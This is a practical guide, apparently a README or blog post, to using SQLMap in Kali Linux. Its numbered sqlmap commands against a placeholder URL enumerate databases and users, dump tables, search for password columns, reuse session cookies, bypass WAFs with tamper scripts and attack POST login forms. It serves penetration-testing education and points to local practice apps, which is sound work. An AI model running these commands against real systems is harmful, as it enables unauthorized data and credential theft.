# 🔍 SQLMap in Kali Linux - A Practical Guide

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws in web applications. It is included by default in Kali Linux and is a powerful tool for ethical hackers and penetration testers.

> ⚠️ **Legal Disclaimer**: This guide is for **educational purposes** only. Do **not** use SQLMap or any hacking tool on web applications you do not own or have explicit permission to test.

---

## 🛠️ Prerequisites

- Kali Linux installed (bare-metal, VM, or WSL).
- A target web app with a vulnerable SQL injection point (e.g., **DVWA**, **bWAPP**, or custom test app).
- Basic understanding of SQL and HTTP requests.

---

## 🧠 Basic Usage Format

```bash
sqlmap -u "http://target.com/page.php?id=1" [options]
```

📌 Real-World Questions and SQLMap Commands
❓1. How many databases are available in this web application?
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```
📝 This will list all the databases available on the target if the injection is successful.

❓2. What is the current database user?
```bash
sqlmap -u "http://target.com/page.php?id=1" --current-user
```
❓3. What is the name of the current database?
```bash
sqlmap -u "http://target.com/page.php?id=1" --current-db
```
❓4. Is the current database user a DBA (admin)?

sqlmap -u "http://target.com/page.php?id=1" --is-dba
❓5. What tables exist in a specific database?
Replace target_db with the actual database name found from --dbs.

```bash
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables
```
❓6. What columns exist in a specific table?
Replace target_db and target_table with actual names.

```bash
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T target_table --columns
```
❓7. Can we dump the data from a specific table?
```bash
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T target_table --dump
```
❓8. Can we search for password hashes or other keywords?
```bash
sqlmap -u "http://target.com/page.php?id=1" --search -C password
```
❓9. How do we save output to a file?
Use -o to log results:

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs -o
```

Logs are saved in:


~/.sqlmap/output/
❓10. How to use cookies or session tokens?
```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abcd1234"
```
❓11. Can we bypass WAF (Web Application Firewall)?
```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase,charencode
```
❓12. How to use SQLMap with POST requests?
```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin" --dbs
```





🧪 Practice Targets
Use legal and safe targets such as:
DVWA
bWAPP
Mutillidae

Install them in localhost for ethical practice.

📚 Additional Tips
Add --batch to skip all prompts (useful for scripting).

Use --risk=3 --level=5 for deeper testing.

Combine --threads=10 for faster scans (caution: more aggressive).
